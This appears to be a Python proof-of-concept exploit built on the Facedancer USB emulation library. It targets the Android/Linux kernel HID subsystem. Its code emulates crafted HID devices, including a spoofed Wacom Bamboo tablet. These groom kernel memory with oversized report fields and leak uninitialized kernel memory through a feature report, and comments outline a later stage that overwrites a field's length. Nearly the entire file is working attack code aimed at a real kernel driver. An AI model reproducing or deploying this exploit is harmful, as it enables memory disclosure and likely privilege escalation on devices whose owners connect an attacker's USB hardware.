#!/usr/bin/env python3
import asyncio
import logging
import struct

from facedancer import main
from facedancer.future import *
from facedancer.future.request import *
from facedancer.classes import *
from facedancer.classes.hid.usage import *
from facedancer.classes.hid.descriptor import *

# 3 set of devices:
# initial HID device - allocates 3x16k hid fields, then disconnects
# Wacom leak device - leak a 16k feature report, allocate a 16k field 3x until we leak the three fields, then disconnects
# USB HID + webcam device - allocates 3x16k hid fields, overwrite a field's length

# allocate 16k hid_fields A, B, C

@use_inner_classes_automatically
class InitialHIDReportDescriptor(HIDReportDescriptor):
    fields : tuple = (
        USAGE_PAGE       (HIDUsagePage.GENERIC_DESKTOP),
        USAGE            (HIDGenericDesktopUsage.KEYBOARD),
        COLLECTION       (HIDCollection.APPLICATION),
        USAGE_PAGE       (HIDUsagePage.KEYBOARD),

        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-core.c;l=126;drc=c600a55922640b1c4dcfdc5a694cadd2dd9d1599
        # 8204 bytes
        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x20, 0x01),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x20, 0x01),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        USAGE_PAGE       (HIDUsagePage.LEDS),
        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x20, 0x01),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        OUTPUT            (variable=True),

        END_COLLECTION   (),
    )

@use_inner_classes_automatically
class InitialHIDUSBDevice(USBDevice):
    vendor_id: int = 0x1337
    product_id: int = 0xbeef
    class KeyboardConfiguration(USBConfiguration):
        class KeyboardInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 3
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(InitialHIDReportDescriptor()()))
            class ReportDescriptor(InitialHIDReportDescriptor):
                pass

            @class_request_handler(number=USBStandardRequests.GET_INTERFACE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall GET_INTERFACE class requests.
                request.stall()

async def run_monterey_jack():
    logging.info("Beginning Monterey Jack...")

# main(InitialHIDUSBDevice, run_monterey_jack())

# after this, the hid_fields are freed back to the page allocator: the new free FIFO is C, B, A

HID_USAGE_DIGITIZER_PEN = 0x0002
HID_USAGE_DIGITIZER_CONTACTID = 0x51

@use_inner_classes_automatically
class WacomHIDReportDescriptor(HIDReportDescriptor):
    fields : tuple = (
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE            (HID_USAGE_DIGITIZER_PEN),
        COLLECTION       (HIDCollection.APPLICATION),

        # anything is fine; just need to pass
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=446;drc=87beb148038d477fb72113e6ae121a37adc3af5e
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE(HID_USAGE_DIGITIZER_CONTACTID),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (8),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        # This report is allocated with hid_alloc_report_buf and will leak uninitialized memory.
        # thanks to xyzz for figuring this out.
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=2476;drc=87beb148038d477fb72113e6ae121a37adc3af5e
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=709;drc=87beb148038d477fb72113e6ae121a37adc3af5e
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=598;drc=87beb148038d477fb72113e6ae121a37adc3af5e
        REPORT_ID (2),
        REPORT_SIZE      (8),
        REPORT_COUNT     (0x00, 0x20),
        FEATURE            (constant=True),
        END_COLLECTION   (),
    )

HID_REQ_SET_REPORT = 0x9

@use_inner_classes_automatically
class WacomHIDUSBDevice(USBDevice):
    vendor_id: int = 0x056a
    product_id: int = 0x00d0 # BAMBOO_TOUCH
    class KeyboardConfiguration(USBConfiguration):
        class KeyboardInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 3
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(WacomHIDReportDescriptor()()))
            class ReportDescriptor(WacomHIDReportDescriptor):
                pass
            # actually HID_REQ_SET_IDLE...
            @class_request_handler(number=USBStandardRequests.GET_INTERFACE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall GET_INTERFACE class requests.
                request.stall()

            @class_request_handler(number=HID_REQ_SET_REPORT)
            @to_this_interface
            def handle_hid_set_report(self, request: USBControlRequest):
                print(request)
                print(request.data)
                outdata = bytearray(4096)
                request.reply(outdata)
                print(outdata)

main(WacomHIDUSBDevice, run_monterey_jack())
